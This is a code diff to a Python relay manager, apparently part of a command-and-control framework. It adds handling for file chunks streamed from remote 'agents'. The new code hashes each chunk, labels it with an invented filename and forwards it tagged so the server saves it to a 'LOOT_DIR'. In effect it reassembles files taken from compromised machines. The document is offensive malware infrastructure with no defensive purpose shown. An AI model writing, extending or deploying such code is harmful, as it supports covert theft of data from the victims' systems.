@@ -81,6 +81,33 @@ class RelayManager:
                 self.tasks[task_id]["completed_at"] = time.time()
             self._broadcast("task_result", {"agent_id": agent_id, "task_id": task_id, "result": result})
 
+        elif msg_type == "chunk":
+            task_id = message.get("task_id")
+            stream_id = message.get("stream_id")
+            idx = message.get("index")
+            total = message.get("total")
+            data = message.get("data")
+            log.info(f"Chunk {idx+1}/{total} from {agent_id} (stream {stream_id})")
+            
+            # Format exactly as server.py expects to reassemble downloads
+            import hashlib
+            chunk_hash = hashlib.sha256(data.encode()).hexdigest()
+            # If front-end wants [DOWNLOAD_CHUNK] json string:
+            # wait, server.py uses payload["hash"], payload["filename"], payload["data"] etc.
+            # actually we don't have filename in chunk msg, but let's fake it or rely on stream_id
+            chunk_payload = {
+                "stream_id": stream_id,
+                "filename": f"download_{stream_id}.bin",
+                "chunk_index": idx,
+                "total_chunks": total,
+                "hash": chunk_hash,
+                "data": data
+            }
+            # We emit this as a 'result' string starting with [DOWNLOAD_CHUNK] 
+            # so server.py's _broadcast_async intercepts it and saves to LOOT_DIR
+            fake_result = f"[DOWNLOAD_CHUNK]{json.dumps(chunk_payload)}"
+            self._broadcast("task_result", {"agent_id": agent_id, "task_id": task_id, "result": fake_result})
+
         elif msg_type == "ack":
             task_id = message.get("task_id")
             log.debug(f"Ack from {agent_id} for task {task_id}")
